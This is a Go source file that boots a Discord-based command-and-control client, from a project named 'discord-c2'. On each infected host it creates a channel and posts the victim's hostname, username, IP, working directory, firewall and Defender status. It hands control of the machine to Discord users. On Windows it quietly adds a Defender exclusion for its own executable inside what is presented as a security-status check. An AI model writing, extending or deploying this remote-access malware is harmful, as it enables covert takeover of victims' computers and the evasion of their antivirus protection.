// Package bot boots the Discord client, provisions the per-device channel,
// registers slash commands, and runs the message/interaction handlers.
package bot

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"os/user"
	"runtime"
	"strings"
	"syscall"

	"discord-c2/internal/commands"
	"discord-c2/internal/config"
	"discord-c2/internal/logstream"
	"discord-c2/internal/media"
	"discord-c2/internal/winsec"

	"github.com/bwmarrin/discordgo"
)

var (
	// channelID is the Discord text channel associated with this device.
	channelID string
	// guildID is the Discord guild in which device channels and commands live.
	guildID string
	// allowedUsers, when non-empty, restricts control to these Discord user IDs.
	allowedUsers map[string]bool
)

func userAllowed(id string) bool {
	return len(allowedUsers) == 0 || allowedUsers[id]
}

// Run starts the Discord session, ensures commands and the device channel
// exist, posts the connection banner, and blocks until shutdown.
func Run(cfg config.Config) error {
	guildID = cfg.GuildID
	allowedUsers = cfg.AllowedUsers
	commands.SetAllowedUsers(cfg.AllowedUsers)
	if len(allowedUsers) == 0 {
		log.Printf("warning: DISCORD_ALLOWED_USERS is empty; any guild member in the device channel can control this host")
	}

	dg, err := discordgo.New("Bot " + cfg.BotToken)
	if err != nil {
		return fmt.Errorf("create Discord session: %w", err)
	}

	dg.AddHandler(handler)
	dg.AddHandler(commands.Handle)
	// GuildMessages is required for channel traffic; MessageContent lets the
	// message shortcut handler read commands from the device channel.
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsMessageContent

	if err := dg.Open(); err != nil {
		return fmt.Errorf("open Discord session: %w", err)
	}

	log.SetOutput(&logstream.Writer{Base: os.Stdout})

	registerCommands(dg)

	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()

	ipStr := primaryIPv4()
	sessionID := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
	cwd, _ := os.Getwd()

	firewallStatus, defenderStatus := windowsSecuritySummary()

	categoryName := categoryForOS(runtime.GOOS)
	log.Printf("detected OS=%s, assigning category=%s", runtime.GOOS, categoryName)

	categoryID, err := getOrCreateCategory(dg, categoryName)
	if err != nil {
		return fmt.Errorf("ensure category %s: %w", categoryName, err)
	}

	channelName := makeChannelName(hostname, currentUser.Username)
	log.Printf("ensuring device channel %s", channelName)
	chID, err := getOrCreateDeviceChannel(dg, categoryID, channelName)
	if err != nil {
		return fmt.Errorf("ensure device channel %s: %w", channelName, err)
	}

	channelID = chID
	commands.SetChannel(chID)
	logstream.Enable(dg, chID)
	log.Printf("log streaming enabled for channel %s on connect", chID)

	go func() {
		log.Printf("checking ffmpeg availability on %s", runtime.GOOS)
		media.EnsureFFmpegAvailable(dg, chID, nil)
	}()

	firstMsg := fmt.Sprintf(
		"🛰️ New device connected!\n\n"+
			"🧾 Session: *%s*\n"+
			"🌐 IP: `%s`\n"+
			"🙍 User: `%s`\n"+
			"🖥️ Hostname: `%s`\n"+
			"💽 OS: %s\n"+
			"🔧 Arch: `%s`\n"+
			"📂 CWD: `%s`\n"+
			"🛡 Firewall: `%s`\n"+
			"🧬 Defender: `%s`",
		sessionID,
		ipStr,
		currentUser.Username,
		hostname,
		osLabel(runtime.GOOS),
		runtime.GOARCH,
		cwd,
		firewallStatus,
		defenderStatus,
	)
	m, _ := dg.ChannelMessageSend(chID, firstMsg)
	if m != nil {
		dg.ChannelMessagePin(chID, m.ID)
	}

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	return dg.Close()
}

func registerCommands(dg *discordgo.Session) {
	existing, err := dg.ApplicationCommands(dg.State.User.ID, guildID)
	if err != nil {
		log.Printf("failed to list existing application commands: %v", err)
		return
	}

	existingNames := make(map[string]bool, len(existing))
	for _, c := range existing {
		existingNames[c.Name] = true
	}
	for _, cmd := range commands.Definitions() {
		if existingNames[cmd.Name] {
			continue
		}
		if _, err := dg.ApplicationCommandCreate(dg.State.User.ID, guildID, cmd); err != nil {
			log.Printf("failed to register command %s: %v", cmd.Name, err)
		}
	}
}

func primaryIPv4() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "unknown"
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if ip = ip.To4(); ip != nil {
				return ip.String()
			}
		}
	}
	return "unknown"
}

func windowsSecuritySummary() (firewall, defender string) {
	if runtime.GOOS != "windows" {
		return "n/a", "n/a"
	}

	firewall, defender = "unknown", "unknown"
	if err := winsec.EnsureCurrentExeExcluded(); err != nil {
		log.Printf("failed to ensure Defender exclusion for current executable: %v", err)
	}
	if fw, err := winsec.FirewallStatus(); err == nil {
		firewall = fw
	} else {
		firewall = "unknown (error: " + winsec.Truncate(err.Error(), 120) + ")"
	}
	if def, err := winsec.DefenderStatus(); err == nil {
		defender = def
	} else {
		defender = "unknown (error: " + winsec.Truncate(err.Error(), 120) + ")"
	}
	return firewall, defender
}

func categoryForOS(goos string) string {
	switch goos {
	case "windows":
		return "windows"
	case "linux":
		return "linux"
	case "darwin":
		return "mac"
	default:
		return "other"
	}
}

func osLabel(goos string) string {
	switch goos {
	case "windows":
		return "🪟 Windows"
	case "linux":
		return "🐧 Linux"
	case "darwin":
		return "🍎 macOS"
	default:
		return "💻 " + goos
	}
}

// makeChannelName derives a Discord channel name from hostname and username,
// normalizing invalid characters and limiting the length.
func makeChannelName(hostname, username string) string {
	base := strings.ToLower(hostname + "-" + username)
	var b strings.Builder
	prevDash := false
	for _, r := range base {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			b.WriteRune(r)
			prevDash = false
			continue
		}
		if !prevDash {
			b.WriteRune('-')
			prevDash = true
		}
	}
	name := strings.Trim(b.String(), "-")
	if name == "" {
		return "device"
	}
	if len(name) > 90 {
		name = name[:90]
	}
	return name
}
